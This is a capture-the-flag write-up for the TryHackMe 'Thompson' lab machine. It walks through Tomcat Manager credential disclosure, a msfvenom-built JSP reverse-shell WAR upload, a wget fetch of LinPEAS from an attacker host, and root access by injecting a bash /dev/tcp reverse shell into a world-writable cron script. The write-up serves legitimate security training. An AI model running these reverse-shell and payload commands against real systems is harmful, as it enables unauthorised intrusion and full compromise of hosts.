# 🐱 TryHackMe — Thompson

> **Difficulty:** Easy | **OS:** Linux | **Category:** Web / Privilege Escalation
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [Port Scanning](#port-scanning)
  * [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  * [Tomcat Manager — Credential Disclosure](#tomcat-manager--credential-disclosure)
  * [WAR File Upload — Remote Code Execution](#war-file-upload--remote-code-execution)
  * [Reverse Shell](#reverse-shell)
- [Post-Exploitation](#post-exploitation)
  * [Shell Stabilisation](#shell-stabilisation)
  * [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
  * [Writable Script Discovery](#writable-script-discovery)
  * [Cron Job Identification — LinPEAS](#cron-job-identification--linpeas)
  * [Root Access via Cron Injection](#root-access-via-cron-injection)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Thompson** is a TryHackMe machine centred around a misconfigured **Apache Tomcat** deployment. An `nmap` scan reveals Tomcat 8.5.5 running on port 8080, alongside an AJP connector on 8009. Navigating to the Tomcat Manager and entering invalid credentials causes the 401 error page to **disclose valid credentials** in an example configuration snippet — a known Tomcat behaviour. With Manager access, a malicious **WAR file** containing a JSP reverse shell is deployed, granting an initial foothold. Privilege escalation exploits a world-writable shell script that is executed periodically by a root cron job, into which a reverse shell is injected.

---

## Reconnaissance

### Port Scanning

An `nmap` service and version scan of the target returned three open ports:

```
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13   (Apache Jserv Protocol)
8080/tcp open  http    Apache Tomcat 8.5.5
```

> **Key Finding:** Port `8080` was running **Apache Tomcat 8.5.5** — a versioned Java servlet container. The AJP connector on `8009` was noted but not required for exploitation.

---

### Web Enumeration

Navigating to `http://<TARGET>:8080` presented the default Tomcat landing page. Directory enumeration was not necessary — the Tomcat default page itself links to the Manager application:

```
http://<TARGET>:8080/manager
```

---

## Exploitation

### Tomcat Manager — Credential Disclosure

Navigating to `/manager/html` prompted for HTTP Basic Authentication credentials. Deliberately entering incorrect credentials caused the resulting **401 Unauthorized** error page to display a configuration example, which included a set of working credentials for the Manager interface.

> **Key Observation:** Apache Tomcat's default 401 error page historically included a helptext block showing example `tomcat-users.xml` configuration — often with credentials that administrators had forgotten to change or remove. This is a well-known information disclosure behaviour in older Tomcat deployments.

The disclosed credentials were used to successfully authenticate to `/manager/html`, gaining access to the Tomcat Manager dashboard.

---

### WAR File Upload — Remote Code Execution

The Tomcat Manager interface includes a **WAR file deployment** feature — this is by design for application deployment, but when accessible with known credentials it results in direct code execution.

A malicious WAR file containing a JSP reverse shell was generated using `msfvenom`:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=1234 -f war -o shell.war
```

The WAR file was uploaded via the Manager's deploy form. Tomcat deployed the application and exposed it at:

```
http://<TARGET>:8080/shell/
```

---

### Reverse Shell

A Netcat listener was established prior to triggering the payload:

```
nc -lvnp 1234
```

Navigating to the deployed application in the browser triggered the JSP reverse shell, and the listener received a connection — providing an interactive shell on the target running as the Tomcat service user.

---

## Post-Exploitation

### Shell Stabilisation

The initial shell was a basic TTY. It was upgraded using Python:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### User Flag

The user flag was located in Jack's home directory:

```
$ cat /home/jack/user.txt
THM{REDACTED}
```

---

## Privilege Escalation

### Writable Script Discovery

While enumerating `/home/jack`, a shell script named `id.sh` was discovered with the following contents:

```bash
#!/bin/bash
id > /home/jack/test.txt
```

Checking the file permissions revealed the script was **world-writable** — any user on the system could modify its contents.

> **Key Observation:** A world-writable script is only a privilege escalation vector if something privileged executes it. The next step was to determine what, if anything, ran it automatically.

---

### Cron Job Identification — LinPEAS

LinPEAS was uploaded and executed to identify scheduled tasks:

```
wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

The output confirmed that `id.sh` was being executed by a **root cron job** running at a regular interval.

> **Key Observation:** A world-writable script executed periodically by `root` is a direct path to privilege escalation — injecting a reverse shell into it will execute with root privileges when the cron job next fires.

---

### Root Access via Cron Injection

A bash reverse shell payload was written into `id.sh`, overwriting its contents:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER IP>/1234 0>&1' > /home/jack/id.sh
```

A Netcat listener was restarted on port 1234. Within approximately one minute, the cron job executed the modified script and the listener received a shell running as `root`.

The **root flag** was retrieved to complete the machine:

```
# cat /root/root.txt
THM{REDACTED}
```

---

## Flags

| Flag        | Value           |
| ----------- | --------------- |
| 🏳️ **User** | `THM{REDACTED}` |
| 🚩 **Root**  | `THM{REDACTED}` |

---

## Summary

| Stage                    | Technique                                                                             |
| ------------------------ | ------------------------------------------------------------------------------------- |
| **Recon**                | `nmap` scan, Tomcat 8.5.5 on port 8080 identified                                    |
| **Credential Disclosure**| Tomcat 401 error page leaks valid Manager credentials in helptext                     |
| **Initial Access**       | WAR file containing JSP reverse shell deployed via Tomcat Manager                    |
| **Shell**                | Reverse shell triggered by browsing to the deployed app → Netcat listener             |
| **Enumeration**          | LinPEAS confirms world-writable `id.sh` is executed by a root cron job                |
| **Privilege Escalation** | Reverse shell injected into `id.sh` → executed by root cron → root shell             |

---

*Writeup by Aryan Barkhordar*
